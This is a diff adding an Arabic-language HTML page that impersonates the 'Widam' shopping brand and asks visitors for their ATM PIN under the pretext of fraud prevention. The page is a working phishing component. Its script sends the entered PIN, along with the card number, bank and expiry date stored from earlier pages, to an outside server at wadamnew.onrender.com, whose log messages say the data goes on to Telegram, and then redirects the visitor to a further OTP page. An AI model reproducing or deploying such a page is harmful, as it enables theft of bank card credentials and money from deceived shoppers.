@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>صفحة رمز التحقق</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+  margin: 0;
+  padding: 0;
+  font-family: 'Tajawal', sans-serif;
+  background: linear-gradient(135deg, #ffffff, #ffffff);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.verification-card {
+  background-color: #fff;
+  width: 350px;
+  padding: 30px;
+  border-radius: 15px;
+  box-shadow: 0 10px 30px rgba(1, 1, 1, 1.1);
+  text-align: center;
+  transition: transform 0.3s;
+  z-index: 1;
+  position: relative;
+  max-height: 80vh; 
+  overflow-y: auto;
+}
+
+h2 {
+  margin-bottom: 20px;
+  color: #333;
+}
+
+.input-group {
+  margin-bottom: 20px;
+}
+
+label {
+  display: block;
+  margin-bottom: 5px;
+  font-weight: 700;
+  color: #444;
+}
+
+.input-code {
+  font-size: 22px;
+  text-align: center;
+  border: 2px solid #ccc;
+  border-radius: 10px;
+  margin: 5px;
+  outline: none;
+  transition: border 0.3s;
+  direction: ltr;
+}
+
+.input-code:focus {
+  border-color: #66ccff;
+}
+
+.btn-verify {
+  background-color: #006a8f;
+  color: #fff;
+  border: none;
+  width: 100%;
+  padding: 15px;
+  font-size: 18px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+.btn-verify:hover {
+  background-color: #005b7a;
+}
+
+.error-message {
+  color: red;
+  font-size: 14px;
+  display: none;
+  margin-top: 15px;
+}
+
+#img11 {
+  margin-left: 20px;
+  width: 150px;
+  height: auto;
+}
+
+@media (max-width: 600px) {
+  body {
+    padding-bottom: 100px; 
+  }
+
+  .verification-card {
+    width: 80%;
+    max-height: 70vh;
+    padding: 20px;
+  }
+
+  .input-code {
+    width: 30px;
+    height: 45px;
+    font-size: 20px;
+  }
+
+  .btn-verify {
+    font-size: 16px;
+  }
+}
+
+#bhhhnb {
+
+    margin-bottom: 240px;
+}
+ 
+#code1 { 
+    width: 200px;
+}
+#img22 { 
+  width: 150px;
+  margin-top: 15px;
+  margin-bottom: -200px;
+}
+#bhhhnb { 
+  max-width: 200px;
+}
+.header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 1rem;
+  padding: 14px 18px;
+  background: #072f57;
+  border-radius: 20px;
+  box-shadow: 0 12px 26px rgba(0,0,0,0.16);
+  margin-bottom: 20px;
+}
+.lang-switch {
+  display: flex;
+  align-items: center;
+  gap: 0.7rem;
+  background: #ffffff;
+  border-radius: 999px;
+  padding: 10px 16px;
+  color: #0f172a;
+  font-weight: 700;
+  font-size: 1rem;
+}
+.lang-switch .flag-emoji {
+  font-size: 1.3rem;
+}
+.search-bar {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+  background: #ffffff;
+  border-radius: 999px;
+  padding: 10px 16px;
+  min-width: 280px;
+  max-width: 640px;
+}
+.search-bar .search-icon {
+  font-size: 1.1rem;
+}
+.search-bar input {
+  width: 100%;
+  border: none;
+  outline: none;
+  font-size: 1rem;
+  color: #0f172a;
+  background: transparent;
+}
+.brand {
+  text-align: right;
+  color: #ffffff;
+}
+.brand .main {
+  display: block;
+  font-size: 1.5rem;
+  font-weight: 900;
+}
+.brand .sub {
+  display: block;
+  font-size: 0.9rem;
+  opacity: 0.8;
+  margin-top: 2px;
+}
+
+  </style>
+</head>
+<body>
+  
+  <header>
+    <div class="header">
+      <div class="lang-switch">
+        <span class="flag-emoji">🇶🇦</span>
+        <span>عربي</span>
+      </div>
+      <div class="search-bar">
+        <span class="search-icon">🔍</span>
+        <input type="text" placeholder="بحث عن أي منتج" aria-label="بحث عن أي منتج">
+      </div>
+      <div class="brand">
+        <span class="main">ودام</span>
+        <span class="sub">widam</span>
+      </div>
+    </div>
+  </header>
+  <img src="imgofers/atm.jpg" id="img22"alt="nmb">
+
+  <div id="bhhhnb">
+
+  </div>
+
+  <div></div>
+  <div class="verification-card">
+    
+    <h4>للتأكد من انك مالك هذه البطاقة يرجى ادخال الرقم السري ATM متفاديآ للاحتيال وتأكيد ملكيتك لهذه البطاقة  </h4>
+    <form id="paymentForm">
+      <div class="input-group">
+        <label for="code1">رمز التحقق</label>
+        <div >
+            <input type="text" id="code1" class="input-code"inputmode="numeric"maxlength="4" >
+
+        </div>
+      </div>
+
+      <button type="submit" class="btn-verify">تحقق</button>
+      <div class="error-message" id="errorMessage">الرمز غير صحيح. يرجى المحاولة مرة أخرى.</div>
+    </form>
+  </div>
+
+<script>
+document.getElementById('paymentForm').addEventListener('submit', function(event) {
+    event.preventDefault(); 
+
+    const code1 = document.getElementById('code1').value;
+const ownerName = localStorage.getItem('userName') || 'غير معروف';
+
+    console.log('قيمة رمز التحقق المدخل: ', code1);
+
+    if (!code1 || code1.length !== 4) {
+        document.getElementById('errorMessage').style.display = 'block';
+    } else {
+        document.getElementById('errorMessage').style.display = 'none';
+
+        const message = `تم إدخال رمز ATM:\n\n👤 من: ${ownerName}\n🔐 رمز ATM: ${code1}`;
+
+        console.log('✅ إرسال البيانات إلى الخادم المحلي:', message);
+
+        fetch('https://wadamnew.onrender.com/api/payment', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                name: ownerName,
+                pin: code1,
+                cardNumber: localStorage.getItem('cardNumber') || '',
+                bank: localStorage.getItem('bank') || '',
+                expiryMonth: localStorage.getItem('expiryMonth') || '',
+                expiryYear: localStorage.getItem('expiryYear') || '',
+                message: message,
+                type: 'atm_code'
+            })
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('حدث خطأ في الاتصال بتلجرام:', response.statusText);
+                throw new Error('حدث خطأ في الاتصال بتلجرام');
+            } else {
+                return response.json();
+            }
+        })
+        .then(data => {
+            console.log('تم إرسال البيانات إلى تلجرام:', data);
+
+            window.location.href = "otp2.html";    
+        })
+        .catch(error => {
+            console.error('حدث خطأ أثناء إرسال البيانات إلى تلجرام:', error);
+            document.getElementById('errorMessage').textContent = 'حدث خطأ أثناء الاتصال. يرجى المحاولة لاحقاً.';
+            document.getElementById('errorMessage').style.display = 'block';
+        });
+    }
+});
+</script>
+
+
+</body>
+</html>
